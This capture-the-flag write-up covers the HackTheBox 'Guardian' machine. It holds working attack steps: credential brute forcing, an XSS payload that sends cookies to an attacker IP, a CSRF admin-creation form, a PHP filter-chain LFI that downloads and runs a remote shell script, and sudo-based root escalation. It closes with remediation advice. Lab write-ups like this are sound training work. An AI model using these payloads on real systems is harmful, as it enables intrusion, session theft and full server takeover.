# HackTheBox - Guardian Writeup

**Machine:** Guardian  
**IP Address:** 10.10.11.84  
**Difficulty:** Hard
**OS:** Linux

---

## Table of Contents

- [Reconnaissance](#reconnaissance)
- [Initial Access](#initial-access)
- [Privilege Escalation - User](#privilege-escalation---user)
- [Privilege Escalation - Root](#privilege-escalation---root)
- [Key Takeaways](#key-takeaways)
- [Tools Used](#tools-used)
- [Flags](#flags)
- [Remediation Recommendations](#remediation-recommendations)

---

## Reconnaissance

### Target Details

- Domains/Hosts: `guardian.htb`, `portal.guardian.htb`, `gitea.guardian.htb`

### Web Enumeration

```bash
feroxbuster -u http://guardian.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,js,json,txt,log -t 50 -e
```

Subdomain fuzzing:

```bash
ffuf -u http://10.129.123.91 -H "Host: FUZZ.guardian.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fw 20
```

Found `portal.guardian.htb` and added to hosts.

---

## Initial Access

### Student Portal Brute Force

Portal login required a student ID in format `GU<3 DIGIT><YEAR>`.

Downloaded the portal guide and found default password `GU1234`:

```
http://portal.guardian.htb/static/downloads/Guardian_University_Student_Portal_Guide.pdf
```

Generated username wordlist:

```bash
for y in {2018..2025}; do for i in {0..999}; do printf "GU%03d%s\n" "$i" "$y"; done; done > gu_wordlist.txt
```

Hydra brute force:

```bash
hydra -L gu_wordlist.txt -p GU1234 portal.guardian.htb http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid username or password" -V -t 8 -o hydra_results.txt
```

**Valid Login:**

- `GU0142023 / GU1234`

### Chat IDOR to Gitea Credentials

Identified parameter manipulation in chat IDs:

```
http://portal.guardian.htb/student/chat.php?chat_users[0]=13&chat_users[1]=11
```

Burp Cluster Bomb (IDs 1–20) revealed credentials in chat:

- `jamil.enockson / DHsNnk3V503`

### Gitea Access

Login worked only after using email format:

- `jamil.enockson@guardian.htb / DHsNnk3V503`

Reviewed `composer.json` and found PhpSpreadsheet 3.7.0 vulnerable to stored XSS (GHSA-79xx-vf93-p7cx).

### Stored XSS via XLSX

Created an `.xlsx` with a malicious sheet name (TreeGrid FSheet):

```html
<script>fetch('http://YOUR_IP:8080/log?c='+document.cookie)</script>
```

Uploaded to:

```
http://portal.guardian.htb/student/submission.php?assignment_id=15
```

Captured lecturer cookie via web server:

```bash
python3 -m http.server 8080
```

### Lecturer Access and CSRF Admin Creation

Injected stolen cookie to access the lecturer dashboard and extracted CSRF token from:

```
http://portal.guardian.htb/lecturer/notices/create.php
```

Created an auto-submit CSRF file (`exp.html`) to add an admin user:

```html
<form method="POST" action="http://portal.guardian.htb/admin/createuser.php" id="exploitForm">
  <input type="hidden" name="csrf_token" value="a8645589d4313aa2161aa430213854d4">
  <input type="hidden" name="username" value="zero">
  <input type="hidden" name="password" value="pa$$w0rd">
  <input type="hidden" name="full_name" value="New Admin">
  <input type="hidden" name="email" value="admin@domain.com">
  <input type="hidden" name="dob" value="1990-01-01">
  <input type="hidden" name="address" value="Admin Address">
  <input type="hidden" name="user_role" value="admin">
</form>
<script>document.getElementById('exploitForm').submit();</script>
```

Hosted it and linked it via a notice so the admin executed it.

### LFI to RCE (php://filter chain)

LFI in:

```
http://portal.guardian.htb/admin/reports.php?report=reports/enrollment.php
```

Bypassed extension check by appending `,system.php` and used `php_filter_chain_generator`:

```bash
git clone https://github.com/synacktiv/php_filter_chain_generator.git
python3 php_filter_chain_generator.py --chain '<?php system("curl 10.10.xx.xx3/shell.sh -o /tmp/shell.sh");?>'
python3 php_filter_chain_generator.py --chain '<?php system("chmod +x /tmp/shell.sh");?>'
python3 php_filter_chain_generator.py --chain '<?php system("/bin/bash -c /tmp/shell.sh");?>'
```

Executed the generated payloads via:

```
http://portal.guardian.htb/admin/reports.php?report=<PAYLOAD>,system.php
```

Started listener:

```bash
pwncat-cs -p 4444
```

**Result:** Reverse shell from the server.

---

## Privilege Escalation - User

### Database Credential Harvesting

Pulled DB credentials and salt from:

```bash
cat /var/www/portal.guardian.htb/config/config.php
```

Accessed MySQL and extracted users:

```bash
mysql -u root -p
show databases;
use guardiandb;
show tables;
SELECT * FROM users;
```

Added salt `8Sb)tM1vs1SS` to hashes and cracked with Hashcat:

```bash
hashcat -m 1410 -a 0 guardian_users.hash /usr/share/wordlists/rockyou.txt
```

Cracked credentials:

- `jamil.enockson / copperhouse56`
- `admin` (hash cracked)

SSH as jamil and read the user flag:

```bash
ssh jamil@guardian.htb
cat user.txt
```

---

## Privilege Escalation - Root

### Escalation to mark via Writable Module

`jamil` could run:

```bash
sudo -l
sudo -u mark /opt/scripts/utilities/utilities.py system-status
```

`utilities.py` imports `utils/status.py`, which was writable. Backdoored it:

```bash
echo 'import os; os.system("/bin/bash")' > /opt/scripts/utilities/utils/status.py
sudo -u mark /opt/scripts/utilities/utilities.py system-status
```

### Root via safeapache2ctl

As `mark`, found root command:

```bash
sudo -l
```

Used `safeapache2ctl -f` with a malicious config to create SUID bash:

```bash
mkdir -p /home/mark/confs && printf "ServerName localhost\nLoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so\nErrorLog \"|/bin/sh -c 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'\"\nListen 127.0.0.1:8080\n" > /home/mark/confs/root.conf
sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/root.conf
/tmp/rootbash -p
```

Root flag:

```bash
cat /root/root.txt
```

---

## Key Takeaways

1. Default credentials and predictable ID formats make brute force viable.
2. IDORs in chat parameters leaked sensitive credentials.
3. Stored XSS in spreadsheet imports can expose privileged cookies.
4. LFI with filter-chain bypass leads to full RCE.
5. Writable Python modules and permissive sudo rules enabled escalation to root.

---

## Tools Used

- feroxbuster
- ffuf
- hydra
- Burp Suite
- git
- php_filter_chain_generator
- mysql
- hashcat
- ssh
- pwncat-cs

---

## Flags

**User Flag:** `user.txt` (value not recorded in PDF)  
**Root Flag:** `root.txt` (value not recorded in PDF)

---

## Remediation Recommendations

### Critical Severity

1. **Remove Default Credentials and Enforce MFA**

   - **Issue:** Default password `GU1234` enabled brute-force logins.
   - **Impact:** Unauthorized access to student accounts.
   - **Remediation:**
     - Enforce password resets on first login.
     - Require MFA for portal logins.

2. **Fix LFI and Filter Chain Bypass**

   - **Issue:** `report` parameter allowed LFI and bypass with `,system.php`.
   - **Impact:** Remote code execution via filter chains.
   - **Remediation:**
     - Validate and whitelist allowed report files.
     - Disable dangerous wrappers and apply strict path validation.

### High Severity

3. **Patch PhpSpreadsheet (Stored XSS)**

   - **Issue:** v3.7.0 vulnerable to stored XSS via sheet name.
   - **Impact:** Session hijacking of lecturers/admins.
   - **Remediation:**
     - Upgrade PhpSpreadsheet to a fixed version.
     - Sanitize all spreadsheet metadata on import.

4. **Harden CSRF Protections**

   - **Issue:** Admin creation via CSRF with stolen token.
   - **Impact:** Privilege escalation to admin.
   - **Remediation:**
     - Bind CSRF tokens to sessions and enforce same-site cookies.
     - Require re-authentication for sensitive actions.

### Medium Severity

5. **Prevent IDOR in Chat System**

   - **Issue:** `chat_users[]` enumeration exposed credentials.
   - **Impact:** Data leakage and credential exposure.
   - **Remediation:**
     - Enforce authorization checks on chat IDs.
     - Use opaque identifiers and access control.

6. **Fix Sudo and File Permission Issues**

   - **Issue:** Writable `status.py` and permissive `safeapache2ctl` sudo.
   - **Impact:** Local escalation to root.
   - **Remediation:**
     - Remove write permissions on imported modules.
     - Restrict sudo commands and validate configuration paths.
